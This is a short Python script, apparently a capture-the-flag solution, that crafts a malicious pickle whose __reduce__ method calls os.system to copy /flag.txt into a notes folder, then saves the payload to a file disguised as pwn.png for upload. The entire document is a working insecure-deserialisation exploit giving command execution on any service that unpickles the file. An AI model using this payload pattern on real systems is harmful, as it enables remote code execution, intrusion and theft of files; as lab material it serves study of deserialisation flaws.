import os
import pickle

class evilPickle(object):
	def __reduce__(object):
		return (os.system, ("cp /flag.txt notes/",))

pickle_data = pickle.dumps(evilPickle())

p = pickle.dumps(evilPickle())
open("pwn.png","wb").write(p)